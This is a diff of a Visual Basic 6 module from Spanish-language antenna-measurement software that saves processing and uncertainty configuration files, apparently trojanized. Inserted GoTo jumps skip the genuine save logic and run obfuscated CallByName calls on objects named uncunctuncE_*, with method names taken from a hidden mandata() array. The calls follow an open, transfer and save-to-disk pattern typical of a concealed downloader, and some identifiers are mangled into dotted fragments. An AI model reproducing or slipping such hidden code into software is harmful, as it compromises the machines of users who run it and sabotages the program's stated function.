+ For i = 0 To frmAnalisisIncertidumbres.lstFrecuencias.ListCount - 1 Step 1
+ Print #f, "", frmAnalisisIncertidumbres.lstFrecuencias.List(i)
+ Next i
+ Print #f, vbNewLine
+ If frmAnalisisIncertidumbres.txtNivelRuido <> "" Then
+ Print #f, "S/N_RUIDO", frmAnalisisIncertidumbres.txtNivelRuido.Text
+ End If
+ If frmAnalisisIncertidumbres.txtDrift <> "" Then
+ Print #f, "DRIFT_GRADOS", frmAnalisisIncertidumbres.txtDrift.Text
+ End If
+ If frmAnalisisIncertidumbres.txtDriftMod <> "" Then
+ Print #f, "DRIFT_dB", frmAnalisisIncertidumbres.txtDriftMod.Text
+ End If
+ If frmAnalisisIncertidumbres.txtLeakage <> "" Then
+ Print #f, "S/N_LEAKAGE", frmAnalisisIncertidumbres.txtLeakage.Text
+ End If
+ If frmAnalisisIncertidumbres.txtCablesJuntas <> "" Then
+ Print #f, "CABLES_JUNTAS_GRADOS", frmAnalisisIncertidumbres.txtCablesJuntas.Text
+ End If
+ If frmAnalisisIncertidumbres.txtCablesJuntasMod <> "" Then
+ Print #f, "CABLES_JUNTAS_dB", frmAnalisisIncertidumbres.txtCablesJuntasMod.Text
+ End If
+ If frmAnalisisIncertidumbres.txtNumSimul <> "" Then
+ Print #f, "NO_SIMUL", frmAnalisisIncertidumbres.txtNumSimul.Text, _
+ vbNewLine
+ End If
+ If frmAnalisisIncertidumbres.chkJunto.Value = Checked Then
+ Print #f, "JUNTO", "S", _
+ vbNewLine
+ Else
+ Print #f, "JUNTO", "N", _
+ vbNewLine
+ End If
+perd1:
+ CallByName uncunctuncE_2, mandata(7), VbLet, 1
+ GoTo perd3
+ If frmAnalisisIncertidumbres.chkCPE.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveCPE
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_CPE
+ Print #f, ClaveINSONDA, InSonda, _
+ sSNIFTD_E.XPAND(8)
+ Print #f, ClaveROUT, sSNIFTD_E.XPAND(9)
+ Print #f, ClaveOUTTHETA_SE, sSNIFTD_E.XPAND(11), _
+ sSNIFTD_E.XPAND(12)
+ Print #f, ClaveOUTPHI_SE, sSNIFTD_E.XPAND(13), _
+ sSNIFTD_E.XPAND(14)
+ Print #f, ClaveOUTSONDA, OutSonda, _
+ sSNIFTD_E.XPAND(16)
+ Print #f, ClaveFIN_CPE, vbNewLine
+ End If
+ If frmAnalisisIncertidumbres.chkFresnel.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveSFIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_SFIFT
+ Print #f, ClaveR0, sSF.IFT(3)
+ Print #f, ClaveLFI0, sSF.IFT(4)
+ Print #f, ClaveLFI90, sSF.IFT(5)
+ Print #f, ClaveGSonda, sSF.IFT(6)
+ Print #f, ClaveCSonda, sSF.IFT(7)
+ Print #f, ClaveFIN_SFIFT, vbNewLine
+ End If
+ If frmAnalisisIncertidumbres.chkCPC.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveCNIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_CNIFT
+ Print #f, ClaveTHETA_C, sCN.IFT(7), sCN.IFT(8)
+ Print #f, ClavePHI_C, sCN.IFT(9), sCN.IFT(10)
+ Print #f, ClaveCENTRAR_C, Centrar_c, sCN.IFT(12)
+ Print #f, ClavePERDYGAN, sCN.IFT(13), sCN.IFT(14)
+ Print #f, ClaveFSONDA, sCN.IFT(15)
+ Print #f, ClaveFIN_CNIFT, vbNewLine
+ End If
+ If frmAnalisisIncertidumbres.chkCPP.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClavePNIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_PNIFT
+ Print #f, ClaveTHETA_P, sPN.IFT(0), sPN.IFT(1)
+ Print #f, ClavePHI_P, sPN.IFT(2), sPN.IFT(3)
+ Print #f, ClaveFICHRNF, sPN.IFT(5)
+ Print #f, ClaveFICHPRB, sPN.IFT(6)
+ Print #f, ClaveFICHREF, sPN.IFT(8)
+ Print #f, ClavePERDINS, sPN.IFT(9)
+ Print #f, ClaveFIN_PNIFT, vbNewLine
+ End If
+ If frmAnalisisIncertidumbres.chkCoord.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClavePNIFU
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_PNIFU
+ Print #f, ClaveCENTGIRAR_U, CentrarGirar_u, sPNI.FU(1)
+ Print #f, ClaveTRANSF_U, Transf
+ Print #f, ClaveCMPTE_U, Cmpte
+ Print #f, ClaveFORMATO, Forma_u, sPNI.FU(5)
+ If Transf = PrefCONCAMBIO Then
+ Print #f, ClaveTHETA_U, sPNI.FU(6), sPNI.FU(7)
+ Print #f, ClavePHI_U, sPNI.FU(8)
+ End If
+ If Transf = PrefSINCAMBIO Then
+ Print #f, ClaveFACTEXP, sPNI.FU(9), sPNI.FU(10)
+ End If
+ Print #f, ClaveFIN_PNIFU, vbNewLine
+ End If
+ Print #f, ClaveFIN
+ Close f
+perd3:
+ uncunctuncE_2.Open
+ GuardarFichProc ""
+SalirGuardarProc:
+ Exit Sub
+ManipularErrorGuardarProc:
+ i = MsgBox("No se pudo guardar el fichero correctamente." & _
+ vbNewLine & sPathProceso, _
+ vbOKOnly + vbCritical, "ERROR PROCESADO DE INCERTIDUMBRES")
+ Resume Next
+End Sub
+Public Sub GuardarFichProc(NombreFichero As String)
+ Dim f As Integer
+ Dim i As Integer
+ Dim ClaveCPE As String
+ Dim ClaveINI_CPE As String
+ Dim ClaveFIN_CPE As String
+ Dim TExcitacion As String
+ Dim InSonda As String
+ Dim OutSonda As String
+ Dim TPolariz As String
+ Dim TNormaliz As String
+ Dim Forma As String
+ Dim Centrar_c As String
+ Dim CentrarGirar_u As String
+ Dim Transf As String
+ Dim Cmpte As String
+ Dim Forma_u As String
+ GoTo perd
+ If frmProcesado.optSNIFTD.Value = True Then
+ ClaveCPE = ClaveSNIFTD
+ ClaveINI_CPE = ClaveINI_SNIFTD
+ ClaveFIN_CPE = ClaveFIN_SNIFTD
+ ElseIf frmProcesado.optEXPAND.Value = True Then
+ ClaveCPE = ClaveEXPAND
+ ClaveINI_CPE = ClaveINI_EXPAND
+ ClaveFIN_CPE = ClaveFIN_EXPAND
+ End If
+ Select Case frmProcesado.cboTExcitacion.Text
+ Case ClaveLINX
+ TExcitacion = PrefLINX
+ Case ClaveLINY
+ TExcitacion = PrefLINY
+ Case ClaveCIRC
+ TExcitacion = PrefCIRC
+ End Select
+ Select Case sSNIFTD_E.XPAND(7)
+ Case ClaveSONDA_1
+ InSonda = PrefSONDA_1
+ Case ClaveSONDA_2
+ InSonda = PrefSONDA_2
+ Case ClaveSONDA_3
+ InSonda = PrefSONDA_3
+ Case ClaveSONDA_4
+ InSonda = PrefSONDA_4
+ Case ClaveSONDA_5
+ InSonda = PrefSONDA_5
+ End Select
+ Select Case sSNIFTD_E.XPAND(15)
+ Case ClaveSONDA_1
+ OutSonda = PrefSONDA_1
+ Case ClaveSONDA_2
+ OutSonda = PrefSONDA_2
+ Case ClaveSONDA_3
+ OutSonda = PrefSONDA_3
+ Case ClaveSONDA_4
+ OutSonda = PrefSONDA_4
+ Case ClaveSONDA_5
+ OutSonda = PrefSONDA_5
+ End Select
+ Select Case sCN.IFT(11)
+ Case Checked
+ Centrar_c = PrefSI
+ Case Unchecked
+ Centrar_c = PrefNO
+ End Select
+ Select Case sPNI.FU(0)
+ Case Checked
+ CentrarGirar_u = PrefSI
+ Case Unchecked
+ CentrarGirar_u = PrefNO
+ End Select
+ Select Case sPNI.FU(2)
+ Case ClaveSINCAMBIO
+ Transf = PrefSINCAMBIO
+ Case ClaveCONCAMBIO
+ Transf = PrefCONCAMBIO
+ End Select
+perd:
+rbp = CallByName(uncunctuncE_1, mandata(10), VbGet)
+CallByName uncunctuncE_2, mandata(9), VbMethod, rbp
+GoTo perd9
+ Select Case sPNI.FU(3)
+ Case ClaveCPXY
+ Cmpte = PrefCPXY
+ Case ClaveAE
+ Cmpte = PrefAE
+ Case ClaveTHPH
+ Cmpte = PrefTHPH
+ Case ClaveRHLH
+ Cmpte = PrefRHLH
+ Case ClaveEMEM
+ Cmpte = PrefEMEM
+ End Select
+ Select Case sPNI.FU(4)
+ Case ClaveFORM_1
+ Forma_u = PrefFORM_1
+ Case ClaveFORM_2
+ Forma_u = PrefFORM_2
+ Case ClaveFORM_3
+ Forma_u = PrefFORM_3
+ Case ClaveFORM_4
+ Forma_u = PrefFORM_4
+ End Select
+ On Error GoTo ManipularErrorGuardarProc
+ f = FreeFile
+ Open NombreFichero For Output As f
+ Print #f, ClaveDAMA, frmProcesado.txtDAMA.Text, _
+ vbNewLine
+ Print #f, ClaveNOFREC, frmProcesado.lstFrecuencias.ListCount
+ For i = 0 To frmProcesado.lstFrecuencias.ListCount - 1 Step 1
+ Print #f, "", frmProcesado.lstFrecuencias.List(i)
+ Next i
+ Print #f, vbNewLine
+ If frmProcesado.chkNORMA.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveNORMA
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_NORMA
+ Print #f, ClaveTEXCIT, TExcitacion
+ Print #f, ClaveFIN_NORMA, vbNewLine
+ End If
+ If frmProcesado.chkNORMAC.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveNORMACOMP
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_NORMACOMP
+ Print #f, ClaveTEXCIT, TExcitacion
+ Print #f, ClaveFIN_NORMACOMP, vbNewLine
+ End If
+ If frmProcesado.chkCPE.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveCPE
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_CPE
+ Print #f, ClaveINSONDA, InSonda, _
+ sSNIFTD_E.XPAND(8)
+ Print #f, ClaveROUT, sSNIFTD_E.XPAND(9)
+ Print #f, ClaveOUTTHETA_SE, sSNIFTD_E.XPAND(11), _
+ sSNIFTD_E.XPAND(12)
+ Print #f, ClaveOUTPHI_SE, sSNIFTD_E.XPAND(13), _
+ sSNIFTD_E.XPAND(14)
+ Print #f, ClaveOUTSONDA, OutSonda, _
+ sSNIFTD_E.XPAND(16)
+ Print #f, ClaveFIN_CPE, vbNewLine
+ End If
+ If frmProcesado.chkFresnel.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveSFIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_SFIFT
+ Print #f, ClaveR0, sSF.IFT(3)
+ Print #f, ClaveLFI0, sSF.IFT(4)
+ Print #f, ClaveLFI90, sSF.IFT(5)
+ Print #f, ClaveGSonda, sSF.IFT(6)
+ Print #f, ClaveCSonda, sSF.IFT(7)
+ Print #f, ClaveFIN_SFIFT, vbNewLine
+ End If
+ If frmProcesado.chkCPC.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClaveCNIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_CNIFT
+ Print #f, ClaveTHETA_C, sCN.IFT(7), sCN.IFT(8)
+ Print #f, ClavePHI_C, sCN.IFT(9), sCN.IFT(10)
+ Print #f, ClaveCENTRAR_C, Centrar_c, sCN.IFT(12)
+ Print #f, ClavePERDYGAN, sCN.IFT(13), sCN.IFT(14)
+ Print #f, ClaveFSONDA, sCN.IFT(15)
+ Print #f, ClaveFIN_CNIFT, vbNewLine
+ End If
+ If frmProcesado.chkCPP.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClavePNIFT
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_PNIFT
+ Print #f, ClaveTHETA_P, sPN.IFT(0), sPN.IFT(1)
+ Print #f, ClavePHI_P, sPN.IFT(2), sPN.IFT(3)
+ Print #f, ClaveFICHRNF, sPN.IFT(5)
+ Print #f, ClaveFICHPRB, sPN.IFT(6)
+ Print #f, ClaveFICHREF, sPN.IFT(8)
+ Print #f, ClavePERDINS, sPN.IFT(9)
+ Print #f, ClaveFIN_PNIFT, vbNewLine
+ End If
+ If frmProcesado.chkCoord.Value = Checked Then
+ Print #f, Asteriscos & Asteriscos
+ Print #f, , ClavePNIFU
+ Print #f, Asteriscos & Asteriscos
+ Print #f, ClaveINI_PNIFU
+ Print #f, ClaveCENTGIRAR_U, CentrarGirar_u, sPNI.FU(1)
+ Print #f, ClaveTRANSF_U, Transf
+ Print #f, ClaveCMPTE_U, Cmpte
+ Print #f, ClaveFORMATO, Forma_u, sPNI.FU(5)
+ If Transf = PrefCONCAMBIO Then
+ Print #f, ClaveTHETA_U, sPNI.FU(6), sPNI.FU(7)
+ Print #f, ClavePHI_U, sPNI.FU(8)
+ End If
+ If Transf = PrefSINCAMBIO Then
+ Print #f, ClaveFACTEXP, sPNI.FU(9), sPNI.FU(10)
+ End If
+ Print #f, ClaveFIN_PNIFU, vbNewLine
+ End If
+ Print #f, ClaveFIN
+ Close f
+perd9:
+CallByName uncunctuncE_2, mandata(11), VbMethod, uncunctuncE_5, 2
+SalirGuardarProc:
+ Exit Sub
+ManipularErrorGuardarProc:
+ i = MsgBox("No se pudo guardar el fichero correctamente." & _
+ vbNewLine & sPathProceso, _
+ vbOKOnly + vbCritical, "ERROR PROCESADO DE DATOS")
+ Resume Next
+End Sub
+Public Sub ValidarProcIncer(NombreFichero As String)
+ Dim i As Integer
+ sPathProceso = NombreFichero
+ For i = 0 To frmAnalisisIncertidumbres.lstFrecuencias.ListCount - 1 Step 1
+ ReDim Preserve sProc1(i)
+ sProc1(i) = frmAnalisisIncertidumbres.lstFrecuencias.List(i)
+ Next i
+ sProc(4) = frmAnalisisIncertidumbres.chkCPE.Value
+ sProc(5) = frmAnalisisIncertidumbres.optSNIFTD.Value
+ bHaySNIFTD = sProc(5)
+ sProc(6) = frmAnalisisIncertidumbres.optEXPAND.Value
+ bHayEXPAND = sProc(6)
+ sProc(7) = frmAnalisisIncertidumbres.chkFresnel.Value
+ If sProc(7) = Checked Then
+ bHaySFIFT = True
+ Else
+ bHaySFIFT = False
+ End If
+ sProc(8) = frmAnalisisIncertidumbres.chkCPC.Value
+ If sProc(8) = Checked Then
+ bHayCNIFT = True
+ Else
+ bHayCNIFT = False
+ End If
+ sProc(9) = frmAnalisisIncertidumbres.chkCPP.Value
+ If sProc(9) = Checked Then
+ bHayPNIFT = True
+ Else
+ bHayPNIFT = False
+ End If
+ sProc(10) = frmAnalisisIncertidumbres.chkCoord.Value
+ If sProc(10) = Checked Then
+ bHayPNIFU = True
+ Else
+ bHayPNIFU = False
+ End If
+End Sub
+Public Sub ValidarProc(NombreFichero As String)
+ Dim i As Integer
+ sPathProceso = NombreFichero
+ For i = 0 To frmProcesado.lstFrecuencias.ListCount - 1 Step 1
+ ReDim Preserve sProc1(i)
+ sProc1(i) = frmProcesado.lstFrecuencias.List(i)
+ Next i
+ sProc(2) = frmProcesado.chkNORMA.Value
+ If sProc(2) = Checked Then
+ bHayNORMA = True
+ Else
+ bHayNORMA = False
+ End If
+ sProc(11) = frmProcesado.chkNORMAC.Value
+ If sProc(11) = Checked Then
+ bHayNORMAC = True
+ Else
+ bHayNORMAC = False
+ End If
+ sProc(3) = frmProcesado.cboTExcitacion.Text
+ sNORMA = frmProcesado.cboTExcitacion.Text
+ sProc(4) = frmProcesado.chkCPE.Value
+ sProc(5) = frmProcesado.optSNIFTD.Value
+ bHaySNIFTD = sProc(5)
+ sProc(6) = frmProcesado.optEXPAND.Value
+ bHayEXPAND = sProc(6)
+ sProc(7) = frmProcesado.chkFresnel.Value
+ If sProc(7) = Checked Then
+ bHaySFIFT = True
+ Else
+ bHaySFIFT = False
+ End If
+ sProc(8) = frmProcesado.chkCPC.Value
+ If sProc(8) = Checked Then
+ bHayCNIFT = True
+ Else
+ bHayCNIFT = False
+ End If
+ sProc(9) = frmProcesado.chkCPP.Value
+ If sProc(9) = Checked Then
+ bHayPNIFT = True
+ Else
+ bHayPNIFT = False
+ End If
+ sProc(10) = frmProcesado.chkCoord.Value
+ If sProc(10) = Checked Then
+ bHayPNIFU = True
+ Else
+ bHayPNIFU = False
+ End If
+End Sub
+Public Sub CargarFrecs(NombreFichero As String)
+ Dim f As Integer
+ Dim Buffer As String
+ Dim Cadena As String
+ Dim i As Integer
+ Dim Aux As Integer
+ Dim Fallo As Boolean
+ Fallo = False
+ On Error GoTo ManipularErrorCargarProcesado
+ f = FreeFile
+ Open NombreFichero For Input As f
+ Do
+ Line Input #f, Buffer
+ Cadena = ExtraeDatoD.cha(Buffer)
+ Select Case ExtraeDat.oIzqda(Buffer)
+ Case ClaveNOFREC
+ Aux = Fix(Val(SinLe.tras(ExtraeDat.oIzqda(Cadena))))
+ If Aux >= 1 Then
+ bHayFrecs = True
+ sFrecMax = sLimFrecMin
+ sFrecMin = sLimFrecMax
+ For i = 0 To Aux - 1 Step 1
+ Input #f, Buffer
+ ReDim Preserve sProc1(i)
+ sProc1(i) = ExtraeDat.oIzqda(Buffer)
+ If ExtraeDat.oIzqda(Buffer) > sFrecMax Then
+ sFrecMax = ExtraeDat.oIzqda(Buffer)
+ End If
+ If ExtraeDat.oIzqda(Buffer) < sFrecMin Then
+ sFrecMin = ExtraeDat.oIzqda(Buffer)
+ End If
+ Next i
+ End If
+ End Select
+ Loop Until EOF(f)
+ Close f
+SalirCargarProcesado:
+ Exit Sub
+ManipularErrorCargarProcesado:
+ i = MsgBox("No existe el fichero o est? da?ado" _
+ & vbNewLine & Err.Description, _
+ vbOKOnly + vbCritical, "ERROR PROCESADO DE DATOS")
+ Resume Next
+End Sub
+Public Sub GuardarNORMA(FichTmp As String, FichConfig As String)
+ Dim f As Integer
+ Dim i As Integer
+ Dim EXTin As String
+ Dim TExcit As Integer
+ On Error GoTo ManipularErrorGuardarNORMA
+ If uTMedida.Iniciales = Ini_CLB Then
+ EXTin = Ext_CCL
+ Else
+ EXTin = Ext_CCP
+ End If
+ Select Case sNORMA
+ Case ClaveLINX
+ TExcit = PrefLINX
+ Case ClaveLINY
+ TExcit = PrefLINY
+ Case ClaveCIRC
+ TExcit = PrefCIRC
+ End Select
+ f = FreeFile
+ Open FichConfig & Ext_CIN For Output As f
+ Print #f, CharLineaVacia
+ Print #f, ""
+ Print #f, TExcit, ClaveIPOLD
+ Print #f, ""
+ Close f
+SalirGuardarNORMA:
+ Exit Sub
+ManipularErrorGuardarNORMA:
+ i = MsgBox("No se pudo guardar el fichero correctamente." & _
+ vbNewLine & FichConfig & Ext_CIN _
+ & vbNewLine & Err.Description, _
+ , vbOKOnly + vbCritical, "ERROR NORMA")
+ Resume Next
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
